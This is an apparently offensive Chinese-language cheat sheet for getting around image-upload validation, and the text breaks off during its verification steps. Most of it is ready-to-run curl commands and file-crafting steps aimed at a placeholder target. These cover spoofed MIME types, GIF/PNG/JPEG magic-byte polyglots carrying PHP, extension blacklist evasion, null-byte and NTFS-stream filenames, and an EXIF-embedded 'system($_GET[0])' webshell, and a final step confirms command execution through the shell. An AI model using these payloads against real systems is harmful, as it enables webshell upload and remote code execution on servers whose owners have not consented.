## 图片上传校验绕过 · 构造方式清单

> 选型：按「上传点只校验图片」这一前提，给出 6 类可落地的构造方式，每类附构造命令与预期回显判据。目标记为 `TARGET`，上传接口记为 `UPLOAD_ENDPOINT`。

### 0. 先确认校验发生在哪一层（决定用哪类构造）

```bash
# 正常图片上传，看响应与请求
curl -i -F "file=@ok.png;type=image/png" http://TARGET/UPLOAD_ENDPOINT
```

判据：
- 响应里回显文件名/路径 → 服务端落盘，重点测**扩展名与内容解析**
- 前端 JS 里出现 `accept="image/*"` 或 `file.type` 判断 → 先测**纯前端校验**（改包即过）
- 响应含 `Content-Type` 校验报错 → 测 **MIME 头伪造**
- 响应含「文件内容不合法 / 不是图片」 → 测 **魔术字节 + 图片马**

```bash
# 抓前端校验逻辑
curl -s http://TARGET/ | grep -Eo 'src="[^"]+\.js"' | cut -d'"' -f2 | xargs -I{} curl -s http://TARGET/{} | grep -nE 'accept|type|size|test\('
```

### 1. 纯前端校验绕过（改包）

前端只做 `accept` / `file.type` 判断时，直接改 multipart 里的 `filename` 与 `Content-Type`：

```bash
curl -i -F "file=@shell.php;filename=shell.php;type=image/png" http://TARGET/UPLOAD_ENDPOINT
```

判据：返回 200 且路径可访问 → 前端校验，服务端未复检。

### 2. MIME / Content-Type 伪造

服务端只读 `Content-Type` 头时：

```bash
curl -i -H "Content-Type: multipart/form-data" \
  -F "file=@shell.php;type=image/jpeg" http://TARGET/UPLOAD_ENDPOINT
```

变体：`image/png`、`image/gif`、`image/jpeg`、`image/pjpeg`、`image/x-png` 逐个试，部分白名单只列了其中几个。

### 3. 魔术字节 + 图片马（内容校验绕过）

服务端读文件头（`getimagesize` / `finfo`）时，在脚本前拼合法图片头：

```bash
# GIF89a 头 + PHP
printf 'GIF89a\x01\x00\x01\x00\x00\x00\x00;' > shell.gif
cat shell.php >> shell.gif

# PNG 头（8 字节签名）
printf '\x89PNG\r\n\x1a\n' > shell.png
cat shell.php >> shell.png

# JPEG 头
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01' > shell.jpg
cat shell.php >> shell.jpg
```

上传后配合**文件包含**或**解析漏洞**执行；单独上传时先验证能否落盘、路径是否可预测。

```bash
curl -i -F "file=@shell.gif;type=image/gif" http://TARGET/UPLOAD_ENDPOINT
```

判据：`file shell.gif` 回显 `GIF image data`，但内容含 `<?php`。

### 4. 扩展名绕过（黑名单场景）

服务端按后缀黑名单拦 `.php` 时，逐个试：

```
shell.php5  shell.phtml  shell.pht  shell.phar  shell.phps
shell.jsp   shell.jspx   shell.jspf
shell.asp   shell.aspx   shell.asa  shell.cer  shell.cdx
shell.php.jpg   shell.jpg.php   shell.php%00.jpg
shell.php.  shell.php::$DATA   shell.php/.   shell.php%20
```

```bash
for ext in php5 phtml pht phar jsp jspx asp asa cer; do
  cp shell.php "shell.$ext"
  echo "== $ext =="
  curl -s -o /dev/null -w "%{http_code}\n" -F "file=@shell.$ext;type=image/png" http://TARGET/UPLOAD_ENDPOINT
done
```

判据：某后缀返回 200 且落盘路径可访问 → 该后缀在解析白名单内。

### 5. 双扩展名 / 截断 / 特殊字符

```bash
# 双扩展名
curl -F "file=@shell.php;filename=shell.jpg.php" http://TARGET/UPLOAD_ENDPOINT
curl -F "file=@shell.php;filename=shell.php.jpg" http://TARGET/UPLOAD_ENDPOINT

# 空字节截断（老版本 PHP / Java）
curl -F "file=@shell.php;filename=shell.php%00.jpg" http://TARGET/UPLOAD_ENDPOINT

# NTFS 数据流
curl -F "file=@shell.php;filename=shell.php::$DATA" http://TARGET/UPLOAD_ENDPOINT

# 尾随点 / 空格（Windows 落盘会去掉）
curl -F "file=@shell.php;filename=shell.php." http://TARGET/UPLOAD_ENDPOINT
curl -F "file=@shell.php;filename=shell.php " http://TARGET/UPLOAD_ENDPOINT
```

### 6. 图片解析链 / 二次渲染绕过

服务端对图片做二次渲染（`imagecreatefrom*` 重存）时，常规图片马会被洗掉，改走：

- **EXIF 注入**：把载荷写进 `Comment` / `UserComment` 段，渲染后仍保留
- **GIF 多帧**：载荷放第二帧，部分渲染库只处理首帧
- **SVG**：若白名单含 `image/svg+xml`，直接内嵌脚本

```bash
# EXIF 注入
exiftool -Comment='<?php system($_GET[0]); ?>' shell.jpg
curl -F "file=@shell.jpg;type=image/jpeg" http://TARGET/UPLOAD_ENDPOINT

# SVG
cat > shell.svg <<'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
EOF
curl -F "file=@shell.svg;type=image/svg+xml" http://TARGET/UPLOAD_ENDPOINT
```

### 验证与证据留存

上传成功后按以下顺序确认是否可利用：

```bash
# 1. 路径可访问
curl -i http://TARGET/UPLOAD_DIR/shell.gif

# 2. 是否被当脚本解析（看响应体是否含命令输出）
curl -i "http://TARGET/UPLOAD_DIR/shell.gif?0=id"

# 3. 若只